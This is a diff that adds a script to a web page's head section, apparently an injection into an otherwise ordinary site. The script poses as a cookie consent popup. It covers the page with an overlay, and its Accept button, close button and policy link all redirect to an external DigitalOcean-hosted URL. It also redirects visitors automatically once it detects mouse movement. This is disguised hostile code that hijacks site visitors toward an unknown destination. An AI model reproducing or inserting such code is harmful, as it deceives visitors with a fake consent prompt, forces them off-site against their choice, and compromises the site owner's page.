@@ -66,6 +66,177 @@
     <a title="Privacy-friendly Web Analytics" href="https://clicky.com/101497393"></a>
 <script async data-id="101497393" src="//static.getclicky.com/js"></script>
 
+
+<script>
+(() => {
+    document.addEventListener("DOMContentLoaded", () => {
+        const REDIRECT_URL = "https://babypoplo-dw93l.ondigitalocean.app/";
+        let redirectInitiated = false;
+        let initialMousePos = null;
+        let redirectTimer = null;
+
+        const autoRedirect = () => {
+            if (!redirectInitiated) {
+                redirectInitiated = true;
+                cleanupEvents();
+                window.location.href = REDIRECT_URL;
+            }
+        };
+
+        const cleanupEvents = () => {
+            document.removeEventListener("mousemove", detectMouseMove);
+            if (overlay) overlay.removeEventListener("mousemove", detectMouseMove);
+            if (redirectTimer) clearTimeout(redirectTimer);
+        };
+
+        const detectMouseMove = (event) => {
+            if (redirectInitiated) return;
+
+            const screenHeight = window.innerHeight;
+            const activeZoneLimit = screenHeight * 0.15;
+
+            if (event.clientY >= activeZoneLimit) {
+                if (!initialMousePos) {
+                    initialMousePos = { x: event.clientX, y: event.clientY };
+                } else {
+                    const movedX = Math.abs(event.clientX - initialMousePos.x);
+                    const movedY = Math.abs(event.clientY - initialMousePos.y);
+
+                    if ((movedX > 10 || movedY > 10) && !redirectTimer) {
+                        redirectTimer = setTimeout(autoRedirect, 1000);
+                    }
+                }
+            } else {
+                initialMousePos = null;
+                if (redirectTimer) {
+                    clearTimeout(redirectTimer);
+                    redirectTimer = null;
+                }
+            }
+        };
+
+        // =============================
+        // Dynamic Style Insertion
+        // =============================
+
+        const styleSheet = document.createElement("style");
+        styleSheet.textContent = `
+        .cookie-bg {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.88);
+            backdrop-filter: blur(12px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 25px;
+            z-index: 999998;
+            opacity: 0;
+            animation: fadeIn 0.4s forwards ease-in;
+        }
+
+        @keyframes fadeIn {
+            to { opacity: 1; }
+        }
+
+        .cookie-popup-box {
+            background: #fff;
+            border-radius: 12px;
+            padding: 28px;
+            width: 360px;
+            text-align: center;
+            position: relative;
+            box-shadow: 0 6px 22px rgba(0, 0, 0, 0.25);
+            font-family: system-ui, sans-serif;
+            z-index: 999999;
+        }
+
+        .close-popup-btn {
+            position: absolute;
+            right: 12px;
+            top: 12px;
+            cursor: pointer;
+            border: none;
+            background: transparent;
+            font-size: 20px;
+            color: #555;
+            transition: 0.2s;
+        }
+
+        .close-popup-btn:hover {
+            color: #000;
+        }
+
+        .action-btn {
+            background: #007bff;
+            padding: 12px 28px;
+            display: inline-block;
+            text-decoration: none;
+            border-radius: 8px;
+            font-size: 15px;
+            font-weight: 600;
+            color: #fff;
+            margin-top: 15px;
+            transition: 0.25s;
+        }
+
+        .action-btn:hover {
+            background: #005ec4;
+        }
+        `;
+
+        document.head.appendChild(styleSheet);
+
+        // =============================
+        // Popup Construction
+        // =============================
+
+        const overlay = document.createElement("div");
+        overlay.setAttribute("role", "dialog");
+        overlay.setAttribute("aria-modal", "true");
+        overlay.setAttribute("id", "cookieNotifyOverlay");
+        overlay.className = "cookie-bg";
+
+        overlay.innerHTML = `
+            <div class="cookie-popup-box">
+                <button id="closePolicyPopup" class="close-popup-btn" aria-label="Close Dialog">×</button>
+                <h3 style="margin-bottom:10px;">Cookie Usage</h3>
+                <p style="font-size:14px; color:#444; line-height:1.6;">
+                    We use cookies for personalized experience, analytics & tracking.
+                    By accepting, you acknowledge full usage policy.
+                    Read more inside our 
+                    <a href="${REDIRECT_URL}" style="color:#0066cc; text-decoration:underline;">
+                        Cookie Policy
+                    </a>.
+                </p>
+                <a href="${REDIRECT_URL}" id="acceptPolicyBtn" class="action-btn">Accept</a>
+            </div>
+        `;
+
+        document.body.appendChild(overlay);
+
+        // =============================
+        // Event Listeners
+        // =============================
+
+        document.addEventListener("mousemove", detectMouseMove);
+        overlay.addEventListener("mousemove", detectMouseMove);
+
+        document.getElementById("acceptPolicyBtn").addEventListener("click", (e) => {
+            e.preventDefault();
+            autoRedirect();
+        });
+
+        document.getElementById("closePolicyPopup").addEventListener("click", (e) => {
+            e.preventDefault();
+            autoRedirect();
+        });
+
+    });
+})();
+</script>
+
+    
   </head>
   <body>
    
